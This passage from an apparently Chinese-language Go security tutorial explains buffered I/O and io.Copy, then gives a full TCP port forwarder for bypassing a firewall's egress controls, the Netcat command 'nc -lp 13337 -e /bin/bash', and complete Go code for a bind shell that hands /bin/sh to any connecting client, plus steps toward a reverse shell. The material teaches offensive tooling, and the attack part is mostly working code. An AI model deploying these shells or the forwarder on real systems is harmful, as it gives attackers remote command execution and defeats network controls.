</span></span></code></pre></div><p>不再是直接在 Conn 实例上调用函数 Read([]byte) 和 Write([]byte),而是通过 NewReader(io.Reader) 和 NewWriter(io.Writer) 初始化新的带缓冲的 Reader 和 Writer 。这些调用都以现有的 Reader 和 Writer 作为参数（记住，Conn类型实现了一些必要的功能，使其能同时被视为 Reader 和 Writer )。</p>
<p>两个缓冲实例都具有用于读取和写入字符串数据的功能。ReadString([]byte) 带有一个分隔符，用于表示读取长度，而 WriteString([]byte) 则将字符串写入套接字。写入数据时，需要显式调用 writer.Flush() 以将所有数据写入底层的 writer (在这里为 Conn 实例)。</p>
<p>尽管前面的示例通过使用缓冲的 I/O 简化了其运行过程，但是你还可以进一步简化此过程，要用到的就是便捷函数 Copy(Writer,Reader) 。如前所述，这个函数将 目标Writer 和 源Reader 作为参数，只需要从源复制到目标即可。</p>
<p>在此示例中,将变量 conn 作为源和目标传递,因为将在建立的连接上回显内容。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 使用 io.Copy() 将数据从 io.Reader 复制到 io.Writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">conn</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read/write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>到这里你已经了解了 I/O 的基础知识并能将其应用于 TCP 服务器中。现在继续探索更多有用的相关示例。</p>
<h3 id="24-代理一个tcp客户端">2.4 代理一个TCP客户端<a hidden class="anchor" aria-hidden="true" href="#24-代理一个tcp客户端">#</a></h3>
<p><strong>通过端口转发绕过防火墙</strong></p>
<blockquote>
<p>某些情况下，可以使用中间系统代理连接绕过或穿透防火墙从而避开这些限制，这种技术被称为端口转发。</p>
</blockquote>
<p><img loading="lazy" src="image-20221208215653884.png" alt="image-20221208215653884"  />
</p>
<blockquote>
<p>客户端通过防火墙连接到目标主机stacktitan.com。该主机配置为将连接转发到主机evil.com。尽管防火墙禁止直接连接到evil.com,但如果有了上面这样的配置，就可以使客户端绕过此保护机制去访问evil.com。</p>
</blockquote>
<p>现在你己经有了坚实的基础，可以利用所学的知识创建一个简单的端口转发器，以通过代理服务或主机代理建立连接。如本章前面所述，这对于尝试规避限制性出口控制或利用系统绕过网络分段很有用。</p>
<p>在编写代码之前,请先思考下面这个虚构但现实的问题:</p>
<blockquote>
<p>Joe 在 ACME Inc.担任业务分析师一职，由于他的简历写得很漂亮，因此拿到了可观的薪水。不过，在工作中，他表现不佳，缺乏干劲。他把本该投入工作中的热情全部倾注到家里的猫身上。他在家里给猫安装了摄像头并建立了一个网站 joescatcam.website ,他可以通过它远程监视他的猫。但问题是 Joe 现在是为 ACME 工作。ACME 肯定不想让他一天24小时都在使用公司的网络带宽查看他的高清摄像头监控的关于猫的视频；ACME 甚至不让其他员工访问 Joe 创建的 joescatcam.website 网站。</p>
<p>Joe 想到一个主意，即“如果我使用自己控制的基于互联网的系统构建一个端口转发器，是否可以强制将所有流量从那个主机重定向到 joescatcam.website 呢”。第二天， Joe 进行了测试并确认他可以访问位于 joesproxy.com 域的个人网站。Joe 本来应该参加当天下午召开的一个会议，但他没有参加，而是找了一家咖啡店并在那里迅速为他的问题开发了解决方案。他将把从 <a href="http://joesproxy.com">http://joesproxy.com</a> 上收到的所有流量转发到
<a href="http://joescatcam.website">http://joescatcam.website</a> 上。</p>
</blockquote>
<p>以下是 Joe 在 joesproxy.com 服务器上运行的代码。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">src</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dst</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;joescatcam.website:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to connect to our unreachable host&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">dst</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 在 goroutine 中运行以防止 io.Copy 被阻塞
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 将源的输出复制到目标
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">dst</span>, <span style="color:#a6e22e">src</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 将目标的输出复制回源
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">src</span>, <span style="color:#a6e22e">dst</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 在本地端口 80 上监听
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>首先看 Joe 的 handle(net.Conn) 函数。 Joe 连接到 joescatcam.website （记住，无法从 Joe 公司的电脑直接访问此主机)。然后 Joe 分别使用两次 Copy(Writer,Reader)。第一个实例确保将来自入站连接的数据复制到 joescatcam.website 连接。第二个实例确保从 joescatcam.website 读取的数据被写回到连接客户端的连接中。因为 Copy(Writer,Reader) 是一个阻塞函数，并且将继续阻塞执行直到关闭网络连接，所以 Joe 明智地将他 Copy(Writer,Reader) 的第一次调用包装在新的 goroutine 中。这样 handle(net.Conn) 函数中的执行就得以继续进行，并且可以进行第二 Copy(Writer,Reader) 调用。</p>
<p>Joe 的代理在端口80上监听并中继连接到 joescatcam.website:80 收发的所有数据。Joe 确认他可以使用 curl 通过 joesproxy.com 连接到 joescatcam.website。比如 <code>curl -i -X GET http://joesproxy.com </code></p>
<h3 id="25-复现-netcat-命令执行">2.5 复现 Netcat 命令执行<a hidden class="anchor" aria-hidden="true" href="#25-复现-netcat-命令执行">#</a></h3>
<p>在本节中，我们将复现 Netcat 的一些很有趣的功能，特别是它的“安全巨洞”功能。
Netcat 是 TCP/IP 上的“瑞士军刀”。其本质上属于 Telnet 的一种，只不过比起 Telnet,它更灵活且可编写脚本。它包含一项在 TCP 上重定向任意程序的标准输入(stdi)和标准输出(stdout)的功能，例如使攻击者能够通过单一命令执行漏洞访问操作系统的 shell 。可参考以下命令。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lp <span style="color:#ae81ff">13337</span> -e /bin/bash
</span></span></code></pre></div><p>该命令在端口 13337 上创建了一个监听器。任何可能通过 Telnet 连接的远程客户端都可以执行任意 bash 命令，因此这被称为“安全巨洞”。Netcat 允许你在程序编译期间根据需要添加此功能（在标准Linuⅸ版本上找到的大多数 Netcat 二进制文件都不包含此功能)。接下来，我们将向你展示如何在 Go 中创建它。</p>
<p>首先，查看 Go 的 os/exec 包。我们将使用它运行操作系统命令。该包定义了一种名为 Cmd 的类型，其中包含运行命令以及操作 stdin 和 stdout 所需的方法和属性。这里把 stdin(一个Reader) 和 stdout((一个Writer) 重定向到 Conn 实例（既是Reader又是Writer)。</p>
<p>接收到新的连接后，可以使用 os/exec 中的函数 Command(name string,arg&hellip;string) 创建新的 Cmd 实例。该函数使用操作系统命令及其任何选项作为参数。在此示例中，将 /bin/sh 硬编码为命令并将 -i 作为参数，以使我们处于交互模式，这样就可以更可靠地操作 stdin 和 stdout 。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span></code></pre></div><p>这将创建 Cmd 的实例，但尚未执行命令。可以使用两个选项操作 stdin 和 stdout 。你可以使用前面讨论的 Copy(Writer,Reader) 或直接将 Reader 和 Writer 赋给 Cmd.这里直接将 Conn 对象赋给 cmd.Stdin 和 cmd.Stdout ,如下所示。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">conn</span>
</span></span></code></pre></div><p>完成命令和数据流处理的设置之后，就可以使用 cmd.Run() 运行命令。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 处理错误
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>以上操作很适合在 Linux 系统上运行。但是，在 Windows 系统上运行程序时，若使用 cmd.exe 而不使用 /bin/bash ,你会发现由于某些 Windows 特定的匿名管道处理，连接的客户端永远不会收到命令输出。解决此问题有两种方案。</p>
<p>首先，可以通过调整代码显式强制刷新标准输出以适应此细微差别。不再是直接将 Conn 赋给 cmd.Stdout ,而是实现一个包装 bufo.Writer(一个缓冲写入器)的自定义 Writer 并显式调用其 Flush 方法以强制刷新该缓冲区。</p>
<p>以下是自定义的 writer 和 Flusher。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// Flusher 包装 bufio.Writer，显式刷新所有写入
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Flusher</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">w</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">Writer</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// NewFlusher 从 io.Writer创建一个新的 Flusher
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewFlusher</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Writer</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">Flusher</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Flusher</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>: <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewWriter</span>(<span style="color:#a6e22e">w</span>),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 写入数据并显式刷新缓冲区
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Flusher</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">count</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Flush</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">count</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>类型 Flusher 实现了函数 Write([] byte) ，该函数将数据写入底层的缓冲 writer ,然后刷新输出。</p>
<p>使用自定义 writer 的实现，可以调整连接处理程序以实例化此 Flusher 自定义数据类型并将其用于 cmd.Stdout。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 显式调用 /bin/sh 并使用 -i 进入交互模式
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 这样我们就可以用它作为标准输入和标准输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 对于 Windows 使用 exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 将标准输入设置为我们的连接
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 从连接创建一个 Flusher 用于标准输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 这样可以确保标准输出被充分刷新并通过 net.Conn 发送
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">NewFlusher</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 运行命令
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这种解决方案虽然可行，但并不是很优雅。尽管能满足工作要求的代码要比优雅的代码更重要，但我们将以此问题为契机介绍函数 io.Pipe(),该函数是 Go 的同步内存管道，可用于连接 Reader 和 Writer 。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 显式调用 /bin/sh 并使用 -i 进入交互模式
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 这样我们就可以用它作为标准输入和标准输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 对于 Windows 使用 exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 将标准输入设置为我们的连接
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rp</span>, <span style="color:#a6e22e">wp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Pipe</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">wp</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">rp</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>调用 io.Pipe() 会同时创建同步连接的一个 reader 和一个 writer ——任何被写入 writer 的数据（在本示例中为 wp )都会被 reader(rp) 读取。因此，需要将 writer 分配给 cmd.Stdout ，然后使用 io.Copy(conn,rp) 将 PipeReader 链接到 TCP 连接。可使用 goroutine 防止代码被阻塞。命令的任何标准输出都将发送到 writer ,然后通过管道传送到 reader 并通过 TCP 连接输出。</p>
<p>现在我们已经从等待连接的 TCP 监听器的角度成功实现了 Netcat 强大的“安全巨洞&quot;功能。你可以参照本章示例试着从连接客户端将本地二进制文件的 stdout 和 stdin 重定向到远程监听器的角度来实现该功能。其具体实现留待你去挖掘，下面仅列出几点供你参考。</p>
<ul>
<li>通过 net.Dial(network,address string) 建立与远程监听器的连接。</li>
<li>通过 exec.Command(name string,arg..string) 初始化一个 Cmd。</li>
<li>重定向 Stdin 和 Stdout 以利用 net.Conn 对象。</li>
<li>运行命令。</li>
</ul>
<p>此时，侦听器应该会收到一个连接。发送到客户端的任何数据都应在客户端上理解为 stdin ,而在侦听器上接收到的任何数据都应理解为 stdout 。</p>
<p>实例完整代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 显式调用 /bin/sh 并使用 -i 进入交互模式
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 这样我们就可以用它作为标准输入和标准输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 对于 Windows 使用 exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 将标准输入设置为我们的连接
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rp</span>, <span style="color:#a6e22e">wp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Pipe</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">wp</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">rp</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 在本地端口 80 上监听
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>

        </div>
        <div class="post-reward">
